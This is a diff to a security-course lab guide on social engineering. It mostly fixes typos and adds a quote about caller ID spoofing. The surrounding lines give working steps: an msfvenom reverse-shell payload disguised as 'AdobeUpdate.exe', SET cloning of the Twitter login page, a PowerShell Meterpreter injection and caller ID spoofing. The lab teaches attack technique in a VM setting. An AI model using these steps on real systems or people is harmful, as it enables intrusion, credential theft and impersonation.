@@ -35,7 +35,7 @@ exploited.
 
 4.    In Kali, type `msfvenom --list formats` to see a list of output formats that
       msfvenom supports. Examine the "Framework Executable Formats" section.
-      We’ll use `exe` optoin (via `-f exe`) option to create a Windows executable.
+      We’ll use `exe` option (via `-f exe`) option to create a Windows executable.
 5.    In Kali, run the following command, all on one line:
 
           msfvenom -p windows/meterpreter/reverse_tcp LHOST=virbr1 -f exe > /tmp/AdobeUpdate.exe
@@ -165,8 +165,8 @@ In this section, you’ll use the Social Engineering Toolkit (SET) to craft soci
      the IP address of Kali Linux for the host-only network. If SET already displays the correct IP address
      in brackets (e.g., "[192.168.56.101]"), just push enter.
 
-     Now you get to choose the website to clone. However, not all websites' login processes can be automatedly cloned.
-     One login page that was verified to work as of Novermber 2020 is `https://twitter.com/` -- set this address as the one
+     Now you get to choose the website to clone. However, not all websites' login processes can be automatically cloned.
+     One login page that was verified to work as of November 2020 is `https://twitter.com` -- set this address as the one
      to clone.
 
      **Note:** Be sure you enter "https" in the URL.
@@ -243,14 +243,14 @@ execute it on Windows which opens a Meterpreter session on attacker’s machine.
 4.   Enter your Kali VM IP address `192.168.56.101` and accept the default of port `443`. Choose `yes` to start the listener.
      This will automatically open `msfconsole` and run some commands for you to set up a listener like you did manually in Part 1.
 5.   Open another terminal and navigate to `/root/.set/reports/powershell/`
-6.   From that directory, open the script using the leafpad command:
+6.   From that directory, open the script using the `leafpad` command:
 
           leafpad x86_powershell_injection.txt
 
 
      {% include lab-image.html image='powershell-save-payload.png' %}
 
-7.   Copy the entire script you found on leafpad to the clipboard. On Windows, open a command line prompt (search for and run `cmd`).
+7.   Copy the entire script you found on `leafpad` to the clipboard. On Windows, open a command line prompt (search for and run `cmd`).
 
      {% include lab-image.html image='windows-run-cmd.png' %}
 
@@ -274,7 +274,6 @@ Take a screenshot showing the output of running the following commands from your
     shell
     echo "your first and last name"
     date /t
-
 
 # Part 4. Create a Malicious Microsoft Word Document
 
@@ -412,17 +411,22 @@ See the example below:
 
 In this section, you’ll use the app [SpoofCard](https://www.spoofcard.com) to spoof your phone number when making a call.
 This is a common technique used by social engineers to lend credibility to their calls when
-(vishing)[https://en.wikipedia.org/wiki/Voice_phishing].
+[vishing](https://en.wikipedia.org/wiki/Voice_phishing). According to [Social-Engineer.org](https://www.social-engineer.org/framework/se-tools/phone/caller-id-spoofing/):
+
+> Caller ID has become a common place technology in both business and home use. Especially with the advance of cell phones replacing many of the phone lines people use, caller ID is part of our daily life. Being aware of this fact and how to use this to your advantage is a must for a successful social engineer.
+
+> The basic principal behind caller ID spoofing is to change the information that is displayed on the caller ID display. A few of the points discussed in this framework under authority state that we can use the idea of authority and/or commitment to influence a person. An even stronger presence is the use of credibility. Building credibility can make or break a successful social engineer attack.
 
 {% include lab-image.html image='spoofcard.png' %}
 
 1. Download the SpoofCard app from the Apple App Store or Google Play Store.
-2. Open the app and press "Get Free credits."
-3. Enter your true phone number and email address. Select a 4-6 digit pin. Check the terms of service box, and press "Sign up."
-4. Enter the number of a friend you would like to call in the field "Number to call."
-5. Enter the number of a mutual friend that you would like to spoof in the field "Caller ID to Display".
-6. If you want, select the "Voice Changer" button to change your voice. Optionally, select the
-   "background noise" option and select a background noise.
-7. Select "Call". The app will show an intermediary SpoofCard phone number to call. Call that number to have the
-   SpoofCard service call your friend.
+2. Open the app and press `Get Free credits`.
+3. Enter your true phone number and email address. Select a 4-6 digit pin. Check the terms of service box, and press `Sign up`.
+4. Enter the number of a friend you would like to call in the field `Number to call`.
+5. Enter the number of a mutual friend that you would like to spoof in the field `Caller ID to Display`.
+6. If you want, select the `Voice Changer` button to change your voice. Optionally, select the
+   `background noise` option and select a background noise.
+7. Select `Call`. The app will show an intermediary SpoofCard phone number to call. Tap to call that number so that the SpoofCard service will call your friend.
 8. For a moment, pretend to be your mutual friend before explaining that you spoofed the call.
+
+See [Social-Engineer.org](https://www.social-engineer.org/framework/se-tools/phone/caller-id-spoofing/) for more information about this type of attack.
